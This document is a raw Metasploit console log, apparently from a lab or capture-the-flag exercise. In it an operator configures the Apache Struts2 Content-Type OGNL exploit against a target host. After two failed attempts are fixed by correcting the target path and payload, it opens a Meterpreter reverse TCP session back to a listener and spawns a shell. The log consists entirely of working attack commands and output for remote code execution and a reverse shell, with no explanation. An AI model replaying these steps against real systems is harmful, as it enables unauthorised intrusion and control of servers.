msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.69.173     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(multi/http/struts2_content_type_ognl) > set rport 80
rport => 80
msf5 exploit(multi/http/struts2_content_type_ognl) > set rhost 10.10.56.94
rhost => 10.10.56.94
msf5 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.10.69.173:4444 
[*] Sending stage (3012516 bytes) to 10.10.56.94
[-] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.56.94         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                  yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.69.173     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(multi/http/struts2_content_type_ognl) > run

[*] Started reverse TCP handler on 10.10.69.173:4444 
[-] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
[*] Sending stage (3012516 bytes) to 10.10.56.94
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/struts2_content_type_ognl) > check
[*] 10.10.56.94:80 - Cannot reliably check exploitability.
msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
msf5 exploit(multi/http/struts2_content_type_ognl) > search linux/x86/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  payload/linux/x86/meterpreter/reverse_tcp                        normal  No     Linux Mettle x86, Reverse TCP Stager
   1  payload/linux/x86/meterpreter/reverse_tcp_uuid                   normal  No     Linux Mettle x86, Reverse TCP Stager


Interact with a module by name or index, for example use 1 or use payload/linux/x86/meterpreter/reverse_tcp_uuid

msf5 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.56.94       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /showcase.action  yes       The path to a struts application action
   VHOST                        no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.69.173     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.10.69.173:4444 
[*] Sending stage (980808 bytes) to 10.10.56.94
[*] Meterpreter session 1 opened (10.10.69.173:4444 -> 10.10.56.94:36278) at 2022-11-07 05:27:59 +0000

meterpreter > shell
Process 54 created.
Channel 1 created.
